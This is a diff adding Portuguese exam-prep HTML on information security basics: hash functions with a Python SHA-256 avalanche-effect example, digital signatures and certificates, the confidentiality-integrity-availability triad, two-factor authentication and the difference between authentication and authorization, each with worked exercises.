+<p><strong>Para que serve um hash?</strong> Pense numa impressão digital do arquivo: pequena, sempre do mesmo tamanho e, na prática, única. Em vez de comparar dois discos de 1 TB byte a byte, compara-se o resumo de 64 dígitos de cada um. Se um único bit mudar, o resumo muda por completo, e não existe "parecido": ou bate, ou não bate.</p>
+<p>A assinatura digital aproveita isso. Assinar o documento inteiro com a chave privada seria lento; então se assina só o hash. Quem confere recalcula o hash e verifica a assinatura: se o documento tiver sido alterado, o hash recalculado não baterá. O certificado digital, por sua vez, resolve outra dúvida: "esta chave pública é mesmo de quem diz ser?". Uma autoridade certificadora em quem todos confiam assina essa ligação entre chave e identidade.</p>
 <h3>Funções de hash</h3>
 <p>Uma função de hash gera um resumo de <strong>tamanho fixo</strong> a partir de uma entrada de qualquer tamanho. Propriedades: é <strong>unidirecional</strong> (não dá para recuperar a entrada), qualquer alteração mínima muda completamente o resultado (efeito avalanche) e deve ser resistente a colisões (duas entradas com o mesmo hash).</p>
 <table>
@@ -234,7 +408,30 @@
 <div class="caixa pegadinha"><span class="rotulo">Pegadinha</span>
 <p>O certificado contém a chave <strong>pública</strong>, nunca a privada. A chave privada fica com o titular (em arquivo no tipo A1 ou em token/cartão no tipo A3).</p></div>
 
+<details class="exemplo"><summary>O perito quer mostrar, em sala de aula, o efeito avalanche. O que imprime o código abaixo?</summary>
+<div class="resolucao">
+<pre><code>import hashlib
+a = hashlib.sha256(b"laudo 1").hexdigest()
+b = hashlib.sha256(b"laudo 2").hexdigest()
+print(len(a), a[:16])
+print(len(b), b[:16])
+print(a == b)</code></pre>
+<p class="passo">SHA-256 gera 256 bits = 64 dígitos hexadecimais, qualquer que seja a entrada: <code>len</code> dá 64 nos dois casos.</p>
+<p class="passo">Trocar só o último caractere ("1" por "2") muda o resumo inteiro, sem semelhança entre os dois.</p>
+<pre><code>64 da6776d2e258fed9
+64 c30013305ca005f2
+False</code></pre>
+<p class="resposta-final">Resposta: dois resumos de 64 dígitos completamente diferentes e <code>False</code>. É por isso que hashes iguais demonstram integridade.</p></div></details>
+<details class="exemplo"><summary>Ao abrir um sistema interno, o navegador alerta: "certificado não confiável". Quais verificações podem ter falhado?</summary>
+<div class="resolucao">
+<p class="passo">O navegador confere a <strong>cadeia</strong>: o certificado do site deve ter sido assinado por uma AC que, subindo, chega a uma AC raiz presente no repositório confiável do sistema. Certificado autoassinado ou de AC desconhecida falha aqui.</p>
+<p class="passo">Confere também a <strong>validade</strong> (datas), o <strong>nome</strong> (o domínio acessado precisa constar no certificado) e a <strong>revogação</strong> (LCR ou OCSP).</p>
+<p class="resposta-final">Resposta: cadeia não confiável, certificado vencido, nome divergente ou certificado revogado. Ignorar o alerta abre espaço para MITM.</p></div></details>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Confundir assinatura digital com assinatura <strong>digitalizada</strong> (a imagem escaneada da assinatura em papel). A digitalizada é só uma figura, que pode ser copiada para qualquer documento; não garante integridade nem não repúdio.</p></div>
+
 <h2>Princípios de segurança</h2>
+<p><strong>Por que decorar a tríade CID?</strong> Porque ela é a régua de toda a matéria: cada ataque fere pelo menos um princípio e cada controle protege pelo menos um. Na prova, quase sempre basta perguntar "o que foi perdido?". Se alguém <strong>viu</strong> o que não devia, perdeu-se confidencialidade; se algo foi <strong>mudado</strong>, integridade; se o serviço <strong>parou</strong>, disponibilidade. Autenticidade e não repúdio completam o quadro quando a questão envolve <strong>quem</strong> fez.</p>
 <table>
 <tr><th>Princípio</th><th>Significado</th><th>Ataque ou falha que o viola</th></tr>
 <tr><td><strong>C</strong>onfidencialidade</td><td>Só quem tem autorização acessa</td><td>Interceptação, vazamento</td></tr>
@@ -251,6 +448,23 @@
 <li>Backup e redundância → disponibilidade.</li>
 </ul></div>
 <p>Autenticação forte combina fatores de categorias diferentes: algo que você <strong>sabe</strong> (senha), algo que você <strong>tem</strong> (token, celular) e algo que você <strong>é</strong> (biometria). Duas senhas não formam autenticação de dois fatores, pois são da mesma categoria.</p>
+
+<details class="exemplo"><summary>Classifique o princípio violado: (a) servidor do tribunal fora do ar por DDoS; (b) valor de um laudo alterado no banco de dados; (c) e-mail com dados de investigação lido por um estagiário sem autorização; (d) servidor nega ter enviado um ofício que saiu do seu e-mail sem assinatura digital.</summary>
+<div class="resolucao">
+<p class="passo">(a) O serviço parou: <strong>disponibilidade</strong>.</p>
+<p class="passo">(b) A informação foi modificada indevidamente: <strong>integridade</strong>.</p>
+<p class="passo">(c) Acesso por quem não tinha autorização: <strong>confidencialidade</strong>.</p>
+<p class="passo">(d) Sem assinatura digital, não há como impedir que o autor negue a autoria: falha de <strong>não repúdio</strong>.</p>
+<p class="resposta-final">Resposta: (a) disponibilidade, (b) integridade, (c) confidencialidade, (d) não repúdio.</p></div></details>
+<details class="exemplo"><summary>Quais combinações são autenticação de dois fatores? (a) senha + PIN; (b) senha + código recebido no celular; (c) crachá + digital; (d) digital + reconhecimento facial.</summary>
+<div class="resolucao">
+<p class="passo">(a) Senha e PIN são ambos algo que você <strong>sabe</strong>: um fator só.</p>
+<p class="passo">(b) Senha (sabe) + celular (tem): dois fatores.</p>
+<p class="passo">(c) Crachá (tem) + digital (é): dois fatores.</p>
+<p class="passo">(d) Digital e face são ambos algo que você <strong>é</strong>: um fator só.</p>
+<p class="resposta-final">Resposta: (b) e (c). O que conta é a categoria, não a quantidade de etapas.</p></div></details>
+<div class="caixa pegadinha"><span class="rotulo">Erro comum</span>
+<p>Trocar autenticação por autorização. <strong>Autenticação</strong> confirma quem você é (login). <strong>Autorização</strong> define o que você pode fazer depois de identificado (permissões). O código HTTP 401 é falta de autenticação; o 403, de autorização.</p></div>
 
 <h2>Questões</h2>
 <div class="questao" data-correta="b">
